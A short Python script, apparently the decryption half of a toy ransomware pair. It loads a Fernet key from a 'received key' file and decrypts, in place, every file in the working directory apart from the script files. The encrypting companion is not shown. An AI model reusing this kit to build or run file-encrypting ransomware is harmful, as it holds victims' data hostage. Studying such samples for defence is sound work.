import os
from cryptography.fernet import Fernet


with open("received_key.key", "rb") as thekey:
    key = thekey.read()


files = []
for file in os.listdir():
    if file in ["encrypt.py", "decrypt.py", "received_key.key"]:
        continue
    if os.path.isfile(file):
        files.append(file)

print("[+] Files to be decrypted:", files)


for file in files:
    with open(file, "rb") as thefile:
        encrypted_contents = thefile.read()
    decrypted_contents = Fernet(key).decrypt(encrypted_contents)
    with open(file, "wb") as thefile:
        thefile.write(decrypted_contents)

print("[+] All files decrypted.")

